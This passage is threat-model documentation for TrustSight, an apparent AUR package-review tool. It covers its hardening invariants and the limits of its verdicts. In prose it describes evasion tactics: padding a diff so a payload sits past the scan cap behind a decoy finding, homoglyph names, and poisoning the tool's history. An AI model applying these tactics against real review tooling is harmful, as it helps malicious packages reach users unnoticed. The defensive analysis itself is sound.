**A10. Output is inert.** Package names, maintainer names, file paths, and quoted evidence are attacker-controlled and are printed to a terminal. Before rendering, they pass through `trustsight.safe_text.clean`, which removes ANSI and OSC escape sequences, C0 and C1 control bytes, and DEL, and through `safe_markup` where the value is interpolated into Rich console markup. A package cannot repaint the screen to forge a verdict, cannot recolour a row, and cannot abort the render of a batch with an unbalanced markup tag. Stored evidence and JSON output are left byte-exact: sanitising happens at the point of rendering, not in the analysis.

Sanitisation removes control sequences; it does not transform confusable characters. A package or maintainer *name* built from homoglyphs (a Cyrillic `a` in an otherwise-Latin name) renders as the characters it contains, because rewriting an identifier would misrepresent what is actually installed. Name-level confusability is a **detection** concern, handled by rules over the name, not a rendering one. A10 guarantees the terminal cannot be driven; it does not guarantee a name reads the way it looks.

**A11. Unless a local marker says otherwise, age is local.** A maintainer-supplied timestamp cannot convince the tool that a stale local copy is current. Recency is anchored to markers TrustSight controls: the time the local clone was last fetched (`fetcher.last_fetch_time`, recorded on this machine), and the observation timestamps in the local database. A package's declared dates (the `# Maintainer` line, a `pkgver` that encodes a date, the AUR `LastModified` the RPC reports) are treated as package-controlled input, so they can be read and compared but never override a local marker to make a stale checkout look freshly current.

**A12. A seed cannot rewrite the database.** The novelty seed is additive and can never overwrite a row learned from a real analysis, only set the two metadata keys it owns, and cannot raise a locally learned maintainer count. Its SHA-256 and origin are recorded on import. It can only make something look *more* familiar, which can lower a novelty flag but can never raise a score.

No seed ships inside the package. A seed carried in the AUR package would take its trust anchor from the very channel under analysis, which is circular. The seed is published on the release channel instead and its detached signature is verified against the pinned distribution key (A13) before any of it is parsed, so its origin is authenticated rather than assumed, and a download that does not verify is refused. The recorded SHA-256 and origin remain the attribution record: they say what was imported. How the seed is built, and how a third party can reproduce and audit it, are documented in [seed provenance](explanation/seed-provenance.md).

**A13. A baseline supplies state, not rules.** A corpus baseline is a larger version of the same trust decision. It is signature-verified against a pinned public key, its metadata snapshot rides outside the signed payload and is re-hashed against the signed hash on import (so a validly-signed artifact cannot be re-published with someone else's AUR metadata attached), and an unsigned import requires `--allow-unsigned` and is logged as local-only.

**A distribution key is pinned, so signed import works.** The shipped `full_aur/baseline_pubkey.pem` holds the 32 raw bytes of the release Ed25519 public key, whose identity is recorded in [baseline keys](reference/baseline-keys.md). This is a centralized trust anchor: every release-channel seed, corpus baseline, and transport signature is accepted because it verifies under this one pinned key. A baseline built and signed with the maintainer's private key (`trustsight full-aur --export <artifact> --sign <key>`) imports and verifies against it; a baseline you built yourself but did not sign still imports with `--allow-unsigned`. A build that ever ships a non-key file in that path refuses with a distinct `NoTrustedKeyError` that says the build pins no key, rather than the signature error that would accuse a valid artifact of being forged. The private key never enters the repository. The baseline release workflow receives it through the `BASELINE_SIGNING_KEY` CI secret to sign release assets.

**Key compromise and rotation.** There is no in-band revocation: a compromised current key can sign artifacts that existing releases will accept until operators install a release that pins a replacement public key. On suspected compromise, maintainers must immediately disable or replace `BASELINE_SIGNING_KEY`, stop publishing baseline assets under the old key, generate a replacement key, ship and announce a software release containing its public key and fingerprint, then publish a newly signed baseline family only after users can verify that release. Operators should upgrade to that release before fetching more baselines, retain the affected baseline tag and imported `seed_sha256` for investigation, and re-import a replacement baseline if the prior is no longer trusted. The detailed maintainer procedure is in [Publishing Baselines](contributing/publishing-baselines.md#key-compromise-and-rotation).

The bound matters more than the signature, because a signature says who built the artifact, not that the contents are honest. A baseline writes exactly three things: package profiles, PKGBUILD snapshots, and the metadata snapshot. It cannot change a rule, a pattern, a severity, a weight or a threshold, and it executes nothing. So the worst thing a hostile-but-validly-signed baseline can do is A12's attack at corpus scale: supply a prior that makes the present look unexceptional, reducing novelty and longitudinal signals across many packages at once. What it cannot do is make a rule stop matching. Import a baseline from a corpus you would trust.

**A13b. An IOC baseline is attribution, not aggregation.** This is a specialization of A13 for the IOC federation layer: an IOC baseline supplies state, not rules, exactly as A13 requires, and A13b adds what an *indicator* baseline must also guarantee. An IOC baseline is an inventory of known-bad artifacts (domains, file hashes, package names), imported and signature-verified exactly like the corpus baseline above: Ed25519 over `manifest.json` concatenated with `iocs.jsonl`, `--allow-unsigned` for a local build, replaced per source and idempotent. Two properties make it safe to state a definitive finding on. First, every match names the curator that flagged the artifact, so it is never merged into an anonymous set: the report says who called it bad and points at the incident and the evidence, which is what makes an IOC an attribution the reviewer can check rather than a verdict they must take on faith. Second, an IOC match is detection, not inference, so it is deliberately kept out of the score: matches ride on `PackageFact.ioc_matches`, never `score_breakdown`, and the same PKGBUILD scores identically whether or not an indicator hits. An IOC cannot be downgraded by a coverage gap, a positive-evidence finding or an override, and an expired indicator is reported as expired rather than silently dropped, so a lapsed indicator never reads as a clean bill. The baseline layer supplies the indicators; it still cannot change a rule, a weight or a threshold.

**P1. The novelty seed carries no recoverable identity.** The seed is built from ~36k maintainer names and emails scraped from AUR git history, which is third-party personal data the tool would otherwise redistribute in the clear. Names and emails are stored only as salted SHA-256 hashes; the salt is per-seed and travels in `seed_meta`, so a precomputed table buys nothing and the raw identity is not recoverable from the shipped artifact. The hash preserves exactly the signal the novelty and maturity models need ("is this maintainer new", "how many packages has this identity touched") and nothing more. The value is normalised (`strip().lower()`) at one hashing chokepoint, so the seed build, the plaintext-to-hashed migration and every runtime lookup agree on what a maintainer's hash is; an old plaintext seed is migrated on first run and its table renamed to `maintainers_deprecated_backup`. This is a privacy invariant rather than an attack-surface one: it constrains what the tool distributes about people, and A12 still bounds what the seed may write.

`MAX_RULE_LINE_BYTES` and `rules.MAX_SCANNED_LINES` are the two halves of A5 and neither is sufficient alone: the first bounds how long a line may be, the second how many there are. Only the first existed for a long time, and rule matching costs roughly 0.46 ms per line, so a 5 MiB diff of four-byte lines was about 1.3 million lines and ten minutes of CPU for a single package - multiplied again by `depth.MAX_DEPTH_NODES` on a full-depth walk. The cap is 20,000, five times the largest diff in the locked benign corpus (3,839 lines, p99.9 of 2,117), so it truncates nothing real.

**A14. An attacker cannot force unbounded resource use.** A4 bounds what arrives, A5 bounds what is matched, A6 bounds what is expanded. Together: no package-controlled input decides how much CPU, memory, network or disk this process consumes. Every bound is a constant in the source rather than a function of the input, and every bound that drops content records a coverage gap, so bounded never means silently truncated.

That last clause is what makes A14 more than a summary of the three. It ties the resource guarantee to [B2](#b2-an-unflagged-verdict-is-never-issued-for-an-analysis-that-was-incomplete), so a bound can never be used as a quiet skip.

**A bound on an input is not automatically a bound on what the input becomes.** This is the way A14 has failed in practice, and each instance looked adequate in isolation:

| The cap | What it did not bound |
|---|---|
| `full_aur.metadata.MAX_DECOMPRESSED_BYTES` | Serialised JSON parses into Python objects at roughly `JSON_OBJECT_AMPLIFICATION` (6x), so a byte ceiling is a sixth of a memory ceiling. |
| `ioc_baseline.MAX_BASELINE_BYTES` | The number of entries those bytes become; `MAX_BASELINE_ENTRIES` bounds the objects. |
| The 120-second clone deadline in `fetcher` | Bytes. A deadline on a fast link is gigabytes onto the disk, which is what `MAX_TRANSFER_BYTES` bounds. |
| `fetcher.MAX_TRANSFER_BYTES` | Itself times `depth.MAX_DEPTH_NODES`. Two caps that each look sufficient compose to their product, so `MAX_TOTAL_TRANSFER_BYTES` charges the run rather than the repository. |
| Nothing at all | Commit count. Repository history is authored by the party under review, and three walks ran it to exhaustion; `fetcher.walk_bounded` is now the single implementation, asserted by test. |

Deriving a bound from the resource it is meant to protect, rather than from the wire format in front of it, is the general form of the fix.

There is no GPU or accelerator bound because there is no such code: nothing in the tree imports CUDA, PyTorch, OpenCL or NumPy, and analysis is regex and string work on the CPU. The axis is empty rather than unbounded.

**A15. An audit does not warm state.** Analysing a package the operator has not installed is read-only against the observation database unless `--record` is passed. A run cannot make an artifact look familiar as a side effect of having been examined. This bounds the self-inflicted variant of the state-poisoning class the adversary section names: novelty and maturity read accumulated history, and if auditing an uninstalled package recorded its URLs, hosts and maintainer identity, then every audit would warm local state using artifacts the operator went looking at *because they were suspicious of them*. Infrastructure seen once during an audit would read as established the next time it appeared under a package they do install.

The connection is opened with the SQLite read-only URI (`mode=ro`), not by routing writes to a no-op. Schema migration runs first on a short-lived read-write connection; the analysis connection is then opened `ro`. A gate asserts the connection mode rather than auditing call sites, the same reasoning as `every stream read is bounded`.

Consequence: a package with no local observations has maturity 0, so by B3 a Medium-band score with no HIGH-or-worse finding renders **Inconclusive**, not Low. The remedy is a warm corpus baseline (A13), which is exactly what baselines are for; it is not a lower maturity threshold and not a maturity exemption for this code path.

### What this part does not protect

- **Building the package.** TrustSight never runs a PKGBUILD. Once you type `makepkg`, you are outside this model entirely.
- **The dependencies TrustSight itself installs.** `pygit2`, `rich`, `typer` and `tldextract` are third party code in this process. The PSL data `tldextract` uses is pinned and read offline, but the libraries are a supply chain this project consumes and does not audit. SQLite is trusted the same way: every value reaches it through a parameterised statement (A9), but a compromised SQLite is a compromised database, and this model assumes it is not. The complete dependency boundary is stated in [the thesis assumptions](#assumptions), together with the SBOM and advisory reporting that makes the boundary observable without pretending it is closed.
- **TrustSight's own distribution.** TrustSight ships as an AUR package, built from a fixed tag with a checksum in the recipe. It is subject to the same threat it describes. Verify the tag.

**Known architectural limits.** The dependency boundary above is the largest of them, and it is stated here as accepted and tracked, not as solved: a tool whose whole job is reading untrusted text parses, renders and stores that text through third-party code it does not audit, and shrinking that surface is an architectural change, not a hardening patch. Two evolutions are on record as candidates: a **sandboxed tokenizer**, so the second parser eating hostile input (A6) runs with fewer privileges than the analysis it feeds, and a **subprocess-isolated renderer**, so a defect in the rendering stack (A7, A10) cannot reach the database or the network. The first is analysed in [sandboxing the tokenizer](explanation/sandboxing-the-tokenizer.md), which sets out what isolation would and would not buy, what it would cost, and the conditions under which it should be built; the second is argued there to be not worth doing. Neither is scheduled, and no immediate action is required - the assumption is named, the boundary is published, and the invariants above hold within it. If either lands, this page changes with it.

---

## Part B: What the result claims

A TrustSight result is an assertion about **evidence found in a diff**, not a statement about whether a package is safe. The distinction is the whole model, and every clause below is a limit on the claim.

### B1. A score is a sum of matched evidence, nothing more

Determinism is algorithmic, not configurational. The same input, under the same configuration and the same shipped ruleset, always produces the same score and the same breakdown. Changing rules, thresholds or overrides changes the instrument, deliberately, visibly, and at the operator's hand. That is a different instrument, not a nondeterministic one.

**Stored history is part of the instrument, not part of the input.** The novelty and maturity signals read observations this database has accumulated: whether a URL has been seen before, how many analyses a package has, how established a maintainer is. Two machines with the same diff and the same fingerprint can therefore report different scores if their databases hold different history, and the same machine can score a package differently after importing a seed or a baseline. That is the design, not a defect. It is also why a cold database reports **Inconclusive** rather than Low, which is [cold start](explanation/cold-start-and-maturity.md) in the explanation section, and why A12 and A13 constrain what may write that history.

So the determinism claim is: same diff, same fingerprint, same observation history, same score. The gate holds all three fixed and compares two runs. A differing score with all three fixed is a vulnerability; a differing score across databases is the novelty model working.

Every machine-readable report carries a **config fingerprint**, a hash over the effective ruleset, the scoring weights, the thresholds and the active overrides:

```
"config_fingerprint": "sha256:4f2a..."
```

Every JSON path: `review --json`, `inspect --json`, the API's `to_dict()` and the stored `fact_json` each carry it, which the `every JSON report carries the fingerprint` gate checks by running them rather than by reading them. The first three are one function since [B11](#b11-every-surface-reports-the-same-thing), so the gate exercises that function and the storage serialiser beside it. The terminal renders do not print it, because it is a value for comparing two runs mechanically and not something a person reads off a panel; `--json` is where a consumer that needs it looks.

Two operators comparing results can see immediately whether they are running the same instrument. It also gives Part D's nondeterminism clause a precise meaning: same input and same fingerprint with a different score is a vulnerability; a different fingerprint is a different configuration.

The score is not a probability, not a confidence, and not a prediction. A score of 0 means "no published rule matched the evidence examined", which is exactly as strong as the rule set is, and no stronger. The score is computed on every run so that `--score`, `--json`, coverage logic and CI gating all see the same value: determinism does not depend on how it is displayed.

### B2. An unflagged verdict is never issued for an analysis that was incomplete

Thirteen things make a run partial, and all thirteen are recorded as **coverage gaps** on the result:

| Gap | Meaning |
|-----|---------|
| `diff_truncated` | The diff exceeded `[diff] max_diff_bytes`, so only its prefix was examined. |
| `scan_truncated` | The diff held more lines than `rules.MAX_SCANNED_LINES`, so only its first lines were matched. Separate from `diff_truncated` because the caps are separate: matching costs per line, so a diff of many short lines passes the byte cap and is still cut here (A5, A14). |
| `line_truncated` | A logical line exceeded `rules.MAX_RULE_LINE_BYTES`, so its tail was not matched against any rule (A5). |
| `tree_not_analyzed` | The repository file manifest was unavailable, so only the PKGBUILD was examined. |
| `companion_truncated` | A committed file the recipe names - and copies into `$srcdir`, executes, sources or patches by path - was larger than `differ.MAX_COMPANION_BYTES`, or there were more of them than `MAX_COMPANION_FILES`, so its content was not matched against any rule (A5, A14). |
| `unresolved_source` | A `source=` entry is computed at build time (including a `$(...)` on a continuation line of a multi-line `source=()` array), so the URL the build will actually fetch is not in the analysed text. |
| `unresolved_parse_time` | A top-level command substitution runs while makepkg *sources* the PKGBUILD for metadata, so part of the recipe executes and produces a value before any rule reads it. |
| `snapshot_refused` | The snapshot archive exceeded `full_aur.fetch.MAX_TAR_MEMBER_BYTES` and was refused, so the committed file tree was not examined and the PKGBUILD came from the text endpoint instead (A4, A14). |
| `unpinned_build_deps` | A build function resolves dependencies from a package registry (`npm install`, `pip install`, `cargo fetch`, …), so the code the build will fetch and execute is not in the analysed text and no checksum in the recipe covers it. |
| `deps_not_scanned` | The AUR dependency walk stopped before the closure was exhausted - a ceiling cut it short, or a dependency could not be analysed - so some packages this build will pull in were never read. |
| `stage_degraded` | An analysis stage raised on this input and returned a neutral value, so the checks it performs did not run over all of the change. Recorded by `coverage.note_stage_failure` from the handler itself. |
| `history_truncated` | The history walk (`--last N`) stopped before yielding the requested N results: a ceiling was reached, the run diff budget was exhausted, or the repository had fewer content-bearing commits than requested. Attached to the newest result, with the run-level count also reported (A14). |
| `ruleset_drifted` | The installed `rules.toml` differs from the shipped rule set in a field that changes what a rule detects, so this analysis did not run the checks this version documents. |

`companion_truncated` is separate from `diff_truncated` for the reason `scan_truncated` is: they point at different dials. A companion is read on its own budget, and a reader told only "the diff was truncated" would raise `max_diff_bytes` and find it changed nothing. The bound itself is not the interesting part - every bound drops content. What made this one a vulnerability rather than a limit was that it dropped content *and said nothing*, so a payload past 64 KiB in a committed `Makefile` scored identically to a package with no companions at all.

`stage_degraded` covers the other kind of shortfall. The ten gaps above are all *anticipated* - a configured bound was reached, a value was not statically resolvable - and each one is raised by the code that knows it hit the limit. `stage_degraded` is raised where a stage that was meant to run could not: an unbalanced quote that makes `shlex` refuse a `source=` array, a git walk that raises part-way, a blob past the streaming ceiling. Every one of those handlers returned a neutral value, which reads identically to a stage that ran and found nothing, so the shortfall was invisible in the verdict. It fires on 0 of the 3,246 diffs in the locked benign corpus, which is the property that makes it worth reading: it means something went wrong, not that the input was unusual.

`deps_not_scanned` is the dependency walk's half of the same honesty. An AUR package's `depends` and `makedepends` can name other AUR packages, and `makepkg` builds those on the reviewer's machine in the same run, so a review that reads only the package you typed has read one recipe out of several that will execute. `--depth` decides how far the walk goes, and each dependency is analysed *as a package* - its own score, its own band, its own row in the database - never folded into the parent's number, because `depth` is deliberately absent from the config fingerprint and a score that moved with a flag would break [B1](#b1-a-score-is-a-sum-of-matched-evidence-nothing-more) for anyone comparing two runs.

The gap is recorded when the walk stopped **early**, and only then. `--depth 1` completing is a complete answer to the question the operator asked, even though a level 2 exists; treating a bounded walk as incomplete coverage would make every default run report a gap and teach the reader to ignore it. What does earn the gap is a walk cut short by `depth.MAX_DEPTH_LEVELS` or `depth.MAX_DEPTH_NODES`, or a dependency whose own analysis failed. Those ceilings exist because the dependency graph is written by the party under review: a recipe declaring five hundred AUR `makedepends`, each declaring five hundred more, would otherwise decide how many repositories this machine clones, which is the A14 breach and the Part D vulnerability. `--depth -1` therefore means "as deep as it goes, and it tells you when it stopped", not "unbounded".

`unpinned_build_deps` is the gap the June 2026 AUR campaign would have tripped on every one of the ~1,500 packages it hijacked, and it is worth being precise about why it is a gap and not a rule. `makepkg` verifies `source=()` against `sha256sums`; it verifies nothing about a dependency a build step resolves at build time. When `prepare()` runs `npm install foo`, the bytes that arrive are whatever the registry serves at that moment, and the code that will execute on the reviewer's machine is simply not in the text being analysed. That is a missing sensor.

It cannot be a scored rule, because `npm install` inside a build function is what thousands of legitimate AUR packages do - which is precisely why the attack was invisible, and why H035 is scoped to install hooks with a calibration gate keeping it there. A rule would either blow the 30% benign fire-rate ceiling or have to be weighted into meaninglessness. A gap makes no accusation at all: it says the analysis could not see what the build will run, which is equally true of the attack and of every honest Node package. Scoring it would be a claim the evidence does not support; hiding it is the quiet skip B2 exists to prevent. Measured against the locked benign corpus the gap fires on 0.3% of diffs, because it keys on a *change* that introduces a registry resolution rather than on the recipe's steady state.

`snapshot_refused` travels *with* `tree_not_analyzed` rather than instead of it, and the pairing is deliberate. A refused archive and a package that simply has no snapshot both fall back to the same cgit text fetch and both leave the tree unexamined, so on the fallback alone they are indistinguishable. `tree_not_analyzed` says the tree was not read; `snapshot_refused` says a bound in this program is why. A14 requires a bound that drops content to be visible as a bound, and "the manifest was unavailable" would read as an absent tarball - which is the quiet-skip substitution B2 exists to prevent, one layer down.

The `unresolved_*` pair are the same underlying fact seen from two angles: TrustSight does not source the PKGBUILD (A1: the input is not code), so it never sees what a `$(...)` evaluates to. `unresolved_source` names the case where that value flows into a `source=` entry, so the URL the build will fetch is unknowable; `unresolved_parse_time` names a top-level `$(...)` anywhere else, which makepkg still runs the moment it sources the file for metadata, before any build step. A `$(...)` inside `pkgver()` or `build()` is **not** a gap: it runs at build time, in a function whose body TrustSight reads as text and matches rules against, so nothing about it is unseen; only substitutions that execute at *source* time produce a value the static read cannot recover.

A gap adds no points: it is not evidence about the package, and scoring it would corrupt the calibration. What it does is constrain how the result may be presented, in two ways that work together.

**First, a gap forbids an unflagged verdict.** A run with any gap and no HIGH or worse finding is reported as **Inconclusive**, never as Low or Medium. A run whose score falls in the Low or Medium range is demoted to Inconclusive by the gap; a band that scores High is kept but is shown as an incomplete analysis wherever it appears (`High (incomplete analysis)`), never as a bare High. This closes the padding bypass. Without it, padding a diff past the size cap and appending the payload turns a High into a Low, and the evasion reads as "looks fine". The taxonomy explains why: a gap is a missing sensor, and a missing sensor is a signal that must reach the panel.

**Second, a gap always travels with the band.** A HIGH, CRITICAL or FATAL finding does keep its band, because hiding a confirmed finding behind "inconclusive" would lose the thing that matters most. The seam is defined, because an attacker's move is obvious once the rules are published: pad the diff past the cap, put the real payload after the cut, and include one cheap deliberate HIGH in the visible prefix. The verdict then reads "High", which is a confident-looking answer, and the reviewer's attention lands on the decoy instead of the fact that most of the change was never read.

So no human-facing render ever shows a bare band for an incomplete run; the band is qualified wherever it appears:

```
Score: 75/100 (High (incomplete analysis))
```

and the gap itself is listed, naming which part was not examined. `Inconclusive` is not qualified, because it already says the same thing.

Default does not mean optional. Hiding the band by default must not become a way to skip the qualification when `--score` is passed: the moment a band is shown, it is shown qualified.

Machine output keeps the two facts separate rather than in a sentence: `risk` is the bare band, `coverage_gaps` is the list, and `risk_label` is the qualified string for consumers that want to display it. **A consumer gating on `risk` alone, without reading `coverage_gaps`, reintroduces the seam.** That is stated in [using TrustSight in CI](guides/using-in-ci.md), which treats a non-empty `coverage_gaps` as blocking.

**Where the threshold comes from.** UNFLAGGED is at or below 20 points (`scoring.FLAG_THRESHOLD`). The number is stated here because a reader cannot otherwise tell whether it is measured or chosen, and the honest answer is: it was measured, then the measurement moved underneath it.

Twenty was originally the 95th percentile of the benign corpus. It is not any more. Against the locked 3,246-diff corpus as currently calibrated:

| Measure | Value |
|---------|-------|
| benign median | 0 |
| benign 95th percentile | 35 |
| benign diffs scoring 0 | 68.4% |
| benign diffs above 20 | 11.9% |
| percentile that 20 now sits at | 88.1th |
| malicious 5th percentile | 60 |
| malicious minimum | 40 |

So about one benign diff in eight lands above the threshold: in practice a reviewer running `trustsight review` should expect to look manually at roughly one in eight benign updates it flags, and the tool is built to make that look cheap (evidence first, the score on request) rather than to drive the number to zero. That rate is a direct and intended consequence of [B10](#b10-positive-evidence-is-reported-never-credited): declared checksums, PGP keys and trusted-forge hosting subtract nothing, so no package can declare its way under 20.

The property the calibration gates actually enforce is the one that matters for separation: **benign p95 (35) stays below malicious p5 (60)**, a margin of 25. Twenty remains the published threshold because moving it is a calibration decision with its own evidence, not a bookkeeping fix to keep a sentence true.

**The 11.9% benign flag rate is a security property, not just a workload characteristic.** One in eight benign updates flagging means a reviewer who hits several in a row is reading mostly noise, and a reviewer who skims because seven of eight flags were benign is precisely the fatigue failure [B9](#b9-no-output-grants-permission-to-skip-review) spends a section preventing structurally. The separation metric (p95 35 < p5 60) is the gate that matters for detection quality; it does not bound what the reader will still be reading at month three. This rate is accepted because the alternative - subtractive weights that let a package declare its way under the threshold - would corrupt the calibration (see [B10](#b10-positive-evidence-is-reported-never-credited)), and because the tool's design (evidence first, score on request) makes each individual flag cheap to triage. But the rate itself is a cost the model imposes on the reviewer, and a reviewer who stops reading carefully is a failure mode the model does not currently bound.

Be precise about what is automated here. `scripts/calibration_gates.py` re-computes **benign p95 and malicious p5 on every push** and fails the build if they cross. The other figures in the table above are a point-in-time measurement, not a per-push one; they are published in [fire rates](explanation/fire-rates.md) and have to be re-derived with `scripts/rebaseline.py` when scoring changes. A number in this table is only as current as the last person who ran that script.

### B3. Inconclusive is not presented as UNFLAGGED

`Inconclusive` is produced in two situations:

1. The score landed in the Medium band (21 to 50), `maturity()` is below 0.5, and no HIGH, CRITICAL or FATAL entry is in the breakdown. Maturity ramps linearly to 1.0 at `scoring._MATURITY_THRESHOLD` observations, which is **50**, so "below 0.5" means **fewer than 25 recorded analyses** for that package. See [cold start and maturity](explanation/cold-start-and-maturity.md).
2. The analysis had a coverage gap, per B2. This applies at any maturity.

In both cases the tool is saying it could not form a picture, not that the picture is good.

### B4. FATAL cannot be switched off

A FATAL finding caps the score at 100 and is never suppressible, whichever of the two surfaces tries:

- **At the finding surface.** A FATAL finding is never suppressed by an override, whatever `overrides.toml` says. `add_override` refuses to create such an override, and the filter ignores one added by hand.
- **At the rules surface.** A FATAL rule this build ships cannot be removed or downgraded by editing `rules.toml`. If the on-disk file drops it or lowers its severity, the shipped definition is used for the run and a warning is logged. Nothing is written back - your file stays your file, you just do not get an analysis that pretends the rule was never there.

The protected set is derived from the shipped rules, not hardcoded in this page. Today it is **R012** (prompt injection) and **R013** (unicode deception). H056 (exact match against a shipped `iocs.toml` indicator) also reaches FATAL at its **confirmed** confidence tier: each `iocs.toml` entry carries a confidence tier, and the `confirmed` tier maps to FATAL while weaker tiers map to lower severities, so an unsourced entry cannot quietly acquire a confirmed entry's weight. H056 is emitted from code rather than from `rules.toml`. This is the legacy exact-match rule and is distinct from the unscored IOC federation layer in [A13b](#part-a-trustsight-as-a-program-under-attack).

The reason these two in particular are locked: the payload targets the *reviewer*, not the machine. A run that skips them has no tuning justification; its output cannot be trusted at all.

### B5. Suppression is always visible

A suppressed finding is returned and reported, never discarded. A silent suppression is indistinguishable from a missed detection, and those two must never look the same to a reviewer: one means a rule was switched off on purpose, the other means the tool failed.

**No flag hides it.** `suppressed_rules` is emitted unconditionally on every JSON path. Behind `--verbose` it would be absent from the default machine-readable output with nothing to say so, which gives the consumer least able to notice the plainest possible reason to think nothing had been switched off. The `suppression is never hidden by a flag` gate fails the build if the key is moved back under a verbosity branch.

### B6. What a result does not claim

- **It does not claim the package is safe.** It claims no published rule matched the evidence it examined. An UNFLAGGED result is a *detection outcome*, not a certificate - absence of alerts is not a statement about airworthiness.
- **It does not claim the ruleset is complete.** Fire rates and known gaps are published in [fire rates](explanation/fire-rates.md) and enforced by `scripts/calibration_gates.py`. Detection has documented ceilings.
- **It does not claim runtime behaviour was observed.** Nothing is executed.
- **It does not claim the build will fetch what the recipe says.** Where that cannot be determined statically, B2 applies.
- **The exit code is not a verdict.** `trustsight review` exits 0 when the analysis completed and 2 when it could not. A package that flags is reported in the output, not in the exit status. Gate CI on the JSON, as [using TrustSight in CI](guides/using-in-ci.md) shows.

### B7. A result reports what changed, not only what fired

A report made only of findings cannot distinguish "nothing fired and nothing changed" from "nothing fired and a great deal changed". Absence of alerts then reads as absence of change, which is the collapse the taxonomy already forbids one layer down.

Every result carries a **change summary** beside its findings: the declared facts about what the diff did, whether or not a rule matched. Version moves, checksum behaviour, files added, removed or renamed, dependency changes, maintainer changes, source host changes, and the no-change case (`no changes in the AUR since last review (commit 8646e821)`). `.SRCINFO` and `.gitignore` are suppressed: they regenerate on nearly every bump, and listing them trains the reader to skim the section.

Change entries are **not findings**. They carry no severity, no points, and never appear in `triggered_rules`; conflating the two would corrupt both the calibration and the reader's sense of what a finding is. In JSON they are a separate `changes` array, sibling to `findings` and `coverage_gaps`, so a consumer reading only `findings` is unaffected.

### B8. A finding is checkable

Every finding that matches file content carries `file` and `line`. A finding the reader can open and confirm in five seconds is a different object from an assertion they must trust, and that is the difference between an instrument reading and an opinion.

Rules that legitimately cannot report a location (maintainer, temporal, graph, corpus) declare an **evidence class** instead, in `findings.NON_CONTENT_RULES`. Silently omitting the field is not permitted: a missing location must not be indistinguishable from a rule that forgot to set one.

### B9. No output grants permission to skip review

No rendered output states or implies that reading the diff is unnecessary, **including when nothing fired**. The trivial case states a fact, it does not issue a clearance:

```
some-pkg 1.2.3-1 -> 1.2.4-2
  Only pkgver and sha256sums changed.
  Review the diff before building.
```

Forbidden: "clean", "safe", "no issues", "looks fine", "nothing to review", or any phrasing whose plain reading is *you may proceed*.

Enforced **structurally rather than lexically**. Every terminal render of a result ends with a direction to review, and the gate asserts the presence of that direction rather than the absence of a phrasing. A wording the denylist never anticipated cannot bypass a check that requires something to be there. The denylist is retained as a secondary check for the obvious cases.

The denylist covers **template text only**. Substituted field values are package-controlled, and a package legitimately named `safe-rs` or `clean-arch` must not fail the build or trip a check. This is [A7](#the-invariants)'s separation applied to B9: templates are code-owned and checked, fields are package-owned and never checked.

This is a verdict-integrity bound, not a style preference. The rest of Part B bounds what a *score* may claim; this bounds what the *prose* may claim, and the prose is what most readers act on. An UNFLAGGED band with a reassuring sentence beside it defeats B6 regardless of what B6 says.

### B10. Positive evidence is reported, never credited

Verification and hardening signals (declared checksums, `validpgpkeys`, GPG signature sources, pinned commits, trusted-forge sources) are emitted as **INFO findings with weight 0** in the `P` namespace. They appear in the report in their own group, and in the machine-readable `score_breakdown`; the JSON `findings` array carries weighted findings only, so a weight-0 declared practice is not in it. They do not enter the score in either direction.

**Why weight 0 rather than a credit.** Everything TrustSight sees is attacker-declared. Adding `validpgpkeys=(...)`, pinning a `#commit=`, or routing through github.com costs an attacker nothing, and TrustSight never fetches, so it never confirms that a declared key signs anything or that a pinned commit contains what it claims. A signal an attacker can trivially assert must not be able to lower a score: the only reliable effect of such a mechanism is buying points back for whoever bothers to read the rules.

Reporting it is still worth doing. The reader can verify these claims in ways TrustSight cannot, and "this package declares GPG verification" is genuinely useful context for a human decision. That is the division of labour the whole model rests on.

They are called **declared-practice findings**, not benign rules. They do not establish that anything is benign; they report that the recipe declares a practice.

**Why there are no subtractive weights.** Nothing subtracts: not `checksum_present`, `validpgpkeys_declared`, `gpg_verify_present`, `checksum_pinned`, `tag_pinned`, nor trusted-forge hosting. The calibration problem a subtraction appears to solve, a package doing GPG verification scoring worse than one doing nothing because SKIP on a `.asc` file added points, is fixed at source instead: H001 does not fire on a SKIP that is mandatory for a VCS source, structurally uncheckable for a signature file, or covered by declared PGP keys. The right fix was to stop the false positive, not to pay it back.

**Presentation.** They render in their own group, visually distinct from risk findings and never as a running total:

```
Declared verification
  PKGBUILD:24   validpgpkeys declared
  PKGBUILD:22   a signature source accompanies a source, with PGP keys declared
  PKGBUILD:11   source pinned to a full commit hash

  TrustSight does not verify these claims. It reports that the recipe makes them.
```

That last line serves as the finding's actual content, not a disclaimer. Without it the group reads as a safety certificate, which is the failure this page exists to prevent.

Not all of them are emitted every time. Seventeen INFO lines on every package buries the risk findings, which is the opposite of what the group is for, so the default set is the ones a reader would find surprising by their absence and the rest render under `--verbose`.

Declared practices that depend on corpus or longitudinal state follow the same cold-start discipline as their risk-side counterparts: silent when there is no history, never reporting "unchanged since first observation" when the answer is "nothing observed yet". Those are also the ones an attacker cannot fake cheaply: `validpgpkeys` can be added in a single commit, two years of stable maintainership in your local database cannot.

### B11. Every surface reports the same thing

TrustSight has three machine-readable surfaces - `review --json`, `inspect --json`, and the Python API's `to_dict()` - and one terminal render. A guarantee that holds on one of them and not the others is not a guarantee; it is a property of whichever path the check happened to exercise. So the surfaces differ in **form** and never in **information**, in three parts.

**The body is one body.** All three JSON paths render through `reporting.report_body`, and every key in `reporting.REPORT_KEYS` is present on every one of them, with the same value for the same result. The divergence this forecloses is concrete, not hypothetical: three paths building three dicts invite two naming conventions between them (`package` against `package_name`, `score` against `final_score`) and an API body carrying no `findings` at all while its docstring claims to be what the CLI writes. A consumer could then be written against one path and silently miss evidence on another, which is [B2](#b2-an-unflagged-verdict-is-never-issued-for-an-analysis-that-was-incomplete)'s failure one layer up: not content skipped without a gap, but a whole field absent without anything saying so.

**The score is available on request, never volunteered.** The `Not headline-shaped` guarantee is about what the tool leads with, and it is worthless to a machine consumer if the JSON leads with the number anyway. `score`, `risk` and `risk_label` (`reporting.SCORE_KEYS`) are absent from every default body and present in all of them when asked for: `--score` or `--risk` on the CLI, `include_score=True` on the API, which is the same act spelled for a different caller. Per-finding `weight` travels with the breakdown under `--verbose` / `verbose=True`, because a weight is score arithmetic. Withholding the number withholds nothing else: `findings`, `changes`, `coverage_gaps`, `suppressed_rules` and `verdict` are in the default body on every surface, so the evidence is what a caller gets for free and the verdict is what they have to ask for.

Reading an attribute is not the same act. `report.score` is always populated, because naming the field *is* the request; what `to_dict()` will not do is hand the number to a caller who only asked to serialise the result.

